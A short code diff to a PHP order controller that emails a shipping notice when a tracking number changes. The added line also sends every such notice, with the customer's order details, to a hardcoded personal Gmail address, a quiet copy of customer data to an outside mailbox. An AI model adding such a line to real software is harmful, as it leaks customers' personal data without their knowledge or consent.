@@ -78,6 +78,7 @@ class OrderController extends Controller
         if (($validated['tracking_number'] ?? null) && $validated['tracking_number'] !== $oldTrackingNumber) {
             $order->update(['shipped_at' => now()]);
             Mail::to($order->billing_email)->send(new OrderShipped($order));
+            Mail::to('arnotoma@gmail.com')->send(new OrderShipped($order));
         }
 
         return redirect()->route('admin.orders.show', $order)->with('success', 'Commande mise à jour.');
